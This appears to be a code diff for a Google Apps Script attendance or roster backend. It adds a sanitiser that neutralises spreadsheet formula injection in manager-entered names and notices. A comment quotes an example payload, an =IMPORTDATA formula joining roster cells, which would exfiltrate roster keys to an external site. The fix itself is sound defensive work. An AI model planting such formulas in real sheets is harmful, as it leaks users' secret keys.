@@ -1041,8 +1041,16 @@ function actingName_(body, mgr) {
   const v = body ? body.acting_name : undefined;
   if (v === undefined || v === null || v === '') return own;
   if (typeof v !== 'string') return null;
-  const s = v.trim();
+  const s = sheetSafeText_(v.trim());
   return s && s.length <= 40 ? s : null;
+}
+
+/** 主管輸入的文字寫進試算表前，開頭的 = + - @ 換全形（2026-11-03 對抗驗證 #2）：
+ *  否則 Sheets 會把它當公式跑，例如 =IMPORTDATA(…&JOIN(",",roster!C2:C50)) 就能把名冊金鑰送到外部。
+ *  同 Requests.gs reqSheetText_、handleClock 對 device_id 的處理；開頭空白也算（Sheets 會略過空白再判斷）。 */
+function sheetSafeText_(v) {
+  const s = String(v), m = /^(\s*)([=+\-@])/.exec(s);
+  return m ? m[1] + { '=': '＝', '+': '＋', '-': '－', '@': '＠' }[m[2]] + s.slice(m[0].length) : s;
 }
 
 /** 'HH:mm-HH:mm,HH:mm-HH:mm' → [{start,end}] */
@@ -1157,7 +1165,7 @@ function handleMgrAddEmployeeUnlocked_(body) {
   const actor = actingName_(body, mgr);
   if (actor === null) return { ok: false, error: 'bad_acting_name', message: '核定人姓名格式不對' };
 
-  const name = String(body.name || '').trim();
+  const name = sheetSafeText_(String(body.name || '').trim());
   if (!name) return { ok: false, error: 'name_required', message: '請輸入同仁姓名' };
   if (name.length > 20) return { ok: false, error: 'name_too_long', message: '姓名過長' };
   if (name === String(mgr.name).trim()) {
@@ -1406,7 +1414,7 @@ function handleMgrAddNotice(body) {
   const actor = actingName_(body, auth.mgr);
   if (actor === null) return { ok: false, error: 'bad_acting_name', message: '核定人姓名格式不對' };
 
-  const text = String(body.text == null ? '' : body.text).trim();
+  const text = sheetSafeText_(String(body.text == null ? '' : body.text).trim());
   if (!text) return { ok: false, error: 'text_required', message: '請先輸入公告內容' };
   if (text.length > NOTICE_MAX_LEN) {
     return { ok: false, error: 'text_too_long',
